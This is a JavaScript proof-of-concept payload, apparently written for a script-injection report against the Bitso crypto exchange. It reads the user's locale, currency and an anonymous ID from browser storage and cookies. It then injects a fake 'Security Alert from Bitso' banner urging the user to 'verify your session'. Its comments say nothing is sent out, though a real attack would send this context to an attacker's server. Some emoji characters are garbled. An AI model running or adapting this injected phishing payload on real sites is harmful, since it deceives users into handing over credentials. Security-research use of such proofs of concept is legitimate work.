(function() {
    // === Collect real user context from Bitso ===
    const attackContext = {
        url: window.location.href,
        locale: localStorage.getItem('NEXT_LOCALE') || 'en',
        currency: localStorage.getItem('preferredCurrency') || 'USD',
        deviceId: (document.cookie.match(/ajs_anonymous_id=([^;]+)/) || [null, 'unknown'])[1]
    };

    // === Log for proof (no real exfiltration) ===
    console.log("[üéØ Bitso Phishing Context]", attackContext);

    // === Craft a convincing English phishing message ===
    const currency = attackContext.currency;
    const fakeAlert = document.createElement('div');
    fakeAlert.innerHTML = `
        <div style="
            position: fixed;
            top: 20px;
            right: 20px;
            background: #fff8e1;
            border: 2px solid #ff9800;
            padding: 16px;
            border-radius: 8px;
            font-family: sans-serif;
            z-index: 999999;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            max-width: 420px;
            font-size: 14px;
            line-height: 1.4;
            color: #333;
        ">
            <strong style="color: #e65100; display: block; margin-bottom: 6px;">‚ö†Ô∏è Security Alert from Bitso</strong>
            Suspicious activity detected on your ${currency} wallet.<br>
            Please <a href="#" style="color: #1976d2; text-decoration: underline;">verify your session</a> immediately to prevent unauthorized access.
        </div>
    `;
    document.body.appendChild(fakeAlert);

    console.log("[‚ÑπÔ∏è] In a real attack, this context would be sent to the attacker's server to generate a tailored phishing page.");
})();
